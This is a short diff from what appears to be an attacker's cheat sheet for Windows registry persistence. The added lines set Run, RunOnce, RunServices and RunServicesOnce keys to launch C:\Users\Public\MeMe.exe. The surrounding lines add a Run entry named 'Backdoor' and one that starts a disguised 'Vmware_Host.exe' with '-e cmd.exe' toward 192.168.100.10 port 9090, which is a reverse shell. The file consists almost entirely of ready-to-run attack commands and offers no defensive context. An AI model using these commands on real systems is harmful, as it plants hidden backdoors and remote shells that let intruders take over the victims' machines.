@@ -7,6 +7,11 @@ reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
 
 shell reg delete  HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Vmware-Services /f
 
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v Service /t REG_SZ /d "C:\Users\Public\\MeMe.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v Service /t REG_SZ /d "C:\Users\Public\MeMe.exe"
+
 REG ADD HKEY_CURRENT_USER\SOFTWARE\Microsoft\CurrentVersion\Run /v 1 /d "C:\Users\KarMarKhaing\Vmware_Host.exe -e cmd.exe 192.168.100.10 9090"
 
 reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe
